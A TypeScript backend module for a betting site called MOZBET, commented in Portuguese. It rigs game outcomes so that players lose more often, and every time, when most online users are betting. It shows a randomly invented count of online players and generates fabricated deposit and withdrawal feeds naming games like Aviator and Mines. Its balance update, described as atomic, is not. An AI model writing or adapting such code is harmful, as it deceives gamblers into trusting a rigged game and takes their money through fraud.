// Controlador Central de Jogos — MOZBET
// Este módulo decide server-side se um jogador ganha ou perde
// baseado na proporção de apostas ativas vs jogadores online.
// NUNCA importar no frontend!

import { supabaseAdmin } from "@/lib/auth-server";
import crypto from "crypto";

// ==========================================
// CONFIGURAÇÃO DO CONTROLADOR
// ==========================================

export const CONTROLLER_CONFIG = {
  // Janela de tempo para contar apostas "simultâneas" (ms)
  BET_WINDOW: 30 * 1000, // 30 segundos

  // Proporções de vitória baseadas na carga de apostas
  // Se TODOS apostarem (ratio >= 0.9) → 0% ganham (todos perdem)
  // Se mais de metade apostar (ratio >= 0.5) → 20% ganham
  // Se menos de metade apostar (ratio < 0.5) → 40% ganham
  WIN_RATES: {
    ALL_BETTING: 0.0,       // ratio >= 0.9
    MAJORITY_BETTING: 0.20, // 0.5 <= ratio < 0.9
    MINORITY_BETTING: 0.40, // ratio < 0.5
  },

  // Aposta mínima e máxima global (MZN)
  MIN_BET: 1,
  MAX_BET: 50000,
};

// ==========================================
// RASTREIO DE PRESENÇA (Jogadores Online)
// ==========================================
// Mapa em memória de jogadores ativos (userId → timestamp do último heartbeat)
// Em produção, isto iria para Redis ou Supabase Presence
const activePresence = new Map<string, number>();

// Registar heartbeat de presença (chamado periodicamente pelo frontend)
export function registerPresence(userId: string): void {
  activePresence.set(userId, Date.now());
}

// Obter contagem real de jogadores online (privado — só backend/admin)
export function getRealOnlineCount(): number {
  const now = Date.now();
  const TIMEOUT = 60 * 1000; // 60 segundos sem heartbeat = offline
  let count = 0;
  for (const [userId, lastSeen] of activePresence.entries()) {
    if (now - lastSeen < TIMEOUT) {
      count++;
    } else {
      activePresence.delete(userId);
    }
  }
  return Math.max(1, count); // Mínimo 1 para evitar divisão por zero
}

// Gerar contagem FAKE de jogadores online (público — frontend)
export function getFakeOnlineCount(): number {
  return Math.floor(Math.random() * 60) + 80; // 80-140 fake
}

// ==========================================
// RASTREIO DE APOSTAS ATIVAS
// ==========================================
// Mapa de apostas recentes: userId → timestamp da última aposta
const recentBets = new Map<string, number>();

// Registar que um jogador fez uma aposta
export function registerBet(userId: string): void {
  recentBets.set(userId, Date.now());
}

// Contar quantos jogadores apostaram na janela de tempo
function getActiveBettorsCount(): number {
  const now = Date.now();
  let count = 0;
  for (const [userId, betTime] of recentBets.entries()) {
    if (now - betTime < CONTROLLER_CONFIG.BET_WINDOW) {
      count++;
    } else {
      recentBets.delete(userId);
    }
  }
  return count;
}

// ==========================================
// ALGORITMO DE DECISÃO: GANHA OU PERDE?
// ==========================================

export function shouldPlayerWin(userId: string): boolean {
  // 1. Registar esta aposta
  registerBet(userId);

  // 2. Calcular a proporção
  const onlineCount = getRealOnlineCount();
  const bettorsCount = getActiveBettorsCount();
  const ratio = bettorsCount / onlineCount;

  // 3. Determinar a taxa de vitória baseada na proporção
  let winRate: number;
  if (ratio >= 0.9) {
    // Quase todos estão a apostar → todos perdem
    winRate = CONTROLLER_CONFIG.WIN_RATES.ALL_BETTING;
  } else if (ratio >= 0.5) {
    // Mais de metade a apostar → poucos ganham
    winRate = CONTROLLER_CONFIG.WIN_RATES.MAJORITY_BETTING;
  } else {
    // Menos de metade → taxa normal de vitória
    winRate = CONTROLLER_CONFIG.WIN_RATES.MINORITY_BETTING;
  }

  // 4. Decisão criptograficamente aleatória
  const randomValue = crypto.randomBytes(4).readUInt32BE(0) / 0xFFFFFFFF;
  const wins = randomValue < winRate;

  console.log(
    `[GameController] User=${userId.slice(0, 8)} | Online=${onlineCount} | Bettors=${bettorsCount} | Ratio=${(ratio * 100).toFixed(0)}% | WinRate=${(winRate * 100).toFixed(0)}% | Result=${wins ? "WIN" : "LOSS"}`
  );

  return wins;
}

// ==========================================
// GERAÇÃO DE DADOS FAKE PARA EXIBIÇÃO
// ==========================================

// Gerar lista de entradas/depósitos fake
export function generateFakeDeposits(count: number = 5): Array<{ id: string; amount: number; time: string }> {
  const results = [];
  const chars = "ABCDEF0123456789";
  for (let i = 0; i < count; i++) {
    let fakeId = "";
    for (let j = 0; j < 4; j++) fakeId += chars[Math.floor(Math.random() * chars.length)];
    fakeId += "***";

    results.push({
      id: fakeId,
      amount: [50, 100, 200, 500, 1000, 1500, 2000, 3000, 5000][Math.floor(Math.random() * 9)],
      time: `${Math.floor(Math.random() * 5) + 1}min`,
    });
  }
  return results;
}

// Gerar lista de retiradas/saques fake
export function generateFakeWithdrawals(count: number = 5): Array<{ id: string; amount: number; game: string; time: string }> {
  const games = ["Aviator", "Mines", "Plinko", "Taxi Crash", "Lion Zama", "Mega Fruits"];
  const results = [];
  const chars = "ABCDEF0123456789";
  for (let i = 0; i < count; i++) {
    let fakeId = "";
    for (let j = 0; j < 4; j++) fakeId += chars[Math.floor(Math.random() * chars.length)];
    fakeId += "***";

    results.push({
      id: fakeId,
      amount: [200, 500, 1000, 2000, 3500, 5000, 7500, 10000, 15000, 20000][Math.floor(Math.random() * 10)],
      game: games[Math.floor(Math.random() * games.length)],
      time: `${Math.floor(Math.random() * 10) + 1}min`,
    });
  }
  return results;
}

// ==========================================
// VALIDAÇÕES COMUNS
// ==========================================

export async function validateBet(userId: string, amount: number): Promise<{ valid: boolean; error?: string; balance?: number }> {
  if (!amount || typeof amount !== "number" || amount < CONTROLLER_CONFIG.MIN_BET || amount > CONTROLLER_CONFIG.MAX_BET) {
    return { valid: false, error: `Aposta deve ser entre ${CONTROLLER_CONFIG.MIN_BET} e ${CONTROLLER_CONFIG.MAX_BET} MZN` };
  }

  const { data: user, error } = await supabaseAdmin
    .from("users")
    .select("balance")
    .eq("id", userId)
    .single();

  if (error || !user) {
    return { valid: false, error: "Utilizador não encontrado" };
  }

  const currentBalance = Number(user.balance);
  if (currentBalance < amount) {
    return { valid: false, error: "Saldo insuficiente" };
  }

  return { valid: true, balance: currentBalance };
}

// Descontar saldo de forma atómica
export async function deductBalance(userId: string, currentBalance: number, amount: number): Promise<number> {
  const newBalance = Math.max(0, parseFloat((currentBalance - amount).toFixed(2)));
  await supabaseAdmin
    .from("users")
    .update({ balance: newBalance })
    .eq("id", userId);
  return newBalance;
}

// Creditar saldo
export async function creditBalance(userId: string, amount: number): Promise<number> {
  const { data: user } = await supabaseAdmin
    .from("users")
    .select("balance")
    .eq("id", userId)
    .single();

  const currentBalance = Number(user?.balance || 0);
  const newBalance = parseFloat((currentBalance + amount).toFixed(2));
  await supabaseAdmin
    .from("users")
    .update({ balance: newBalance })
    .eq("id", userId);
  return newBalance;
}
